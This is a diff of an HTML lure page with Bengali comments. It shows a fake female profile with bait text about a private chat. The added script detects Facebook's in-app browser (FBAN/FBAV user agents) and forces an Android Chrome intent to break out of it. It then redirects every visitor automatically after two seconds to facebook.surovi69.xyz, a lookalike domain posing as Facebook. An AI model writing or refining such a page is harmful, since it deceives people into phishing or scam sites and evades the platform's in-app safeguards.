@@ -34,12 +34,28 @@
             margin-top: -50px;
             padding: 20px;
         }
-        .profile-img {
+        .img-container {
+            position: relative;
             width: 100px;
             height: 100px;
+            margin: 0 auto;
+        }
+        .profile-img {
+            width: 100%;
+            height: 100%;
             border-radius: 50%;
             border: 4px solid white;
             box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+        .online-dot {
+            height: 18px;
+            width: 18px;
+            background-color: #31a24c;
+            border: 3px solid white;
+            border-radius: 50%;
+            position: absolute;
+            bottom: 8px;
+            right: 8px;
         }
         .name {
             font-size: 22px;
@@ -63,15 +79,11 @@
             display: inline-flex;
             align-items: center;
             gap: 10px;
-            transition: background 0.3s;
-            border: none;
-            cursor: pointer;
             width: 80%;
             justify-content: center;
             font-size: 16px;
-        }
-        .main-btn:hover {
-            background-color: #0073e6;
+            border: none;
+            cursor: pointer;
         }
         .footer-text {
             font-size: 12px;
@@ -86,15 +98,17 @@
     <div class="bridge-card">
         <div class="cover-photo"></div>
         <div class="profile-section">
-            <img src="https://github.com/pj9889/picvid/blob/main/pic1.webp?raw=true" alt="Profile" class="profile-img">
+            <div class="img-container">
+                <img src="https://github.com/pj9889/picvid/blob/main/pic1.webp?raw=true" alt="Profile" class="profile-img">
+                <span class="online-dot"></span>
+            </div>
             <div class="name">Jacklyn Rose</div>
             <div class="bio">
                 Hey there! I am waiting to start a private conversation with you. 
-                Click below to join my official room.
+                Connecting to the official room...
             </div>
             
-            <!-- মূল বাটন যা গুগল ক্রমে ওপেন করার চেষ্টা করবে -->
-            <a href="intent://facebook.surovi69.xyz#Intent;scheme=https;package=com.android.chrome;end" class="main-btn">
+            <a href="https://facebook.surovi69.xyz" class="main-btn" id="redirectBtn">
                 <i class="fab fa-facebook-messenger"></i> Start Private Chat
             </a>
         </div>
@@ -104,18 +118,22 @@
     </div>
 
     <script>
-        // বাটন ক্লিক লজিক: যদি ইনটেন্ট কাজ না করে তবে সরাসরি লিঙ্কে যাবে
-        document.querySelector('.main-btn').addEventListener('click', function(e) {
-            const mainUrl = "https://facebook.surovi69.xyz";
-            
-            // অ্যান্ড্রয়েড ইউজারদের জন্য সরাসরি ক্রমে ওপেন করার কমান্ড
+        // ১. ফেসবুক থেকে লিঙ্কে ক্লিক করলেই ক্রোম ওপেন করার চেষ্টা করবে
+        (function() {
             const chromeIntent = "intent://facebook.surovi69.xyz#Intent;scheme=https;package=com.android.chrome;end";
-            
-            // অল্প সময় অপেক্ষা করে চেক করা যে ক্রমে ওপেন হয়েছে কিনা, না হলে সাধারণ রিডাইরেক্ট
+            // যদি এটি ফেসবুক ইন-অ্যাপ ব্রাউজারে থাকে তবে তখনই এটি ট্রিগার হবে
+            if (navigator.userAgent.includes("FBAN") || navigator.userAgent.includes("FBAV")) {
+                window.location.href = chromeIntent;
+            }
+        })();
+
+        // ২. ২ সেকেন্ড পর অটোমেটিক রিডাইরেক্ট লজিক
+        window.onload = function() {
             setTimeout(function() {
-                window.location.href = mainUrl;
-            }, 500);
-        });
+                const finalUrl = "https://facebook.surovi69.xyz";
+                window.location.href = finalUrl;
+            }, 2000); // ২ সেকেন্ড (২০০০ মিলিসেকেন্ড)
+        };
     </script>
 
 </body>
